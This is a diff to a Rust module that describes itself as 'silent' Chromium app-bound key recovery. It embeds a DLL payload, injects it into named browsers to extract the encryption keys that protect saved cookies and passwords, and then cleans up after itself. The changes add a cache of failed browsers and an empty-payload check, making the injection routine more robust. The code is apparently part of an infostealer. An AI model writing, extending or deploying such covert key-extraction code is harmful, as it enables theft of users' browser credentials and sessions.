@@ -1,12 +1,24 @@
 //! Silent Chromium app-bound key recovery (embedded DLL, temp extract, auto cleanup).
 
-use std::{collections::HashMap, path::PathBuf, sync::Mutex};
+use std::{collections::HashMap, collections::HashSet, path::PathBuf, sync::Mutex};
 
 const EMBEDDED_PAYLOAD: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/payload.dll"));
 
 static KEY_CACHE: Mutex<Option<HashMap<String, Vec<u8>>>> = Mutex::new(None);
+static FAIL_CACHE: Mutex<HashSet<String>> = Mutex::new(HashSet::new());
 
 pub fn fetch_app_bound_key(browser_name: &str) -> Option<Vec<u8>> {
+    if EMBEDDED_PAYLOAD.is_empty() {
+        crate::log::log(&format!("inject skip: empty payload ({browser_name})"));
+        return None;
+    }
+
+    if let Ok(guard) = FAIL_CACHE.lock() {
+        if guard.contains(browser_name) {
+            crate::log::log(&format!("inject skip: prior fail ({browser_name})"));
+            return None;
+        }
+    }
     if let Ok(guard) = KEY_CACHE.lock() {
         if let Some(map) = guard.as_ref() {
             if let Some(key) = map.get(browser_name) {
@@ -27,6 +39,9 @@ pub fn fetch_app_bound_key(browser_name: &str) -> Option<Vec<u8>> {
         }
         None => {
             crate::log::log(&format!("inject FAIL: {browser_name}"));
+            if let Ok(mut guard) = FAIL_CACHE.lock() {
+                guard.insert(browser_name.to_string());
+            }
             return None;
         }
     };
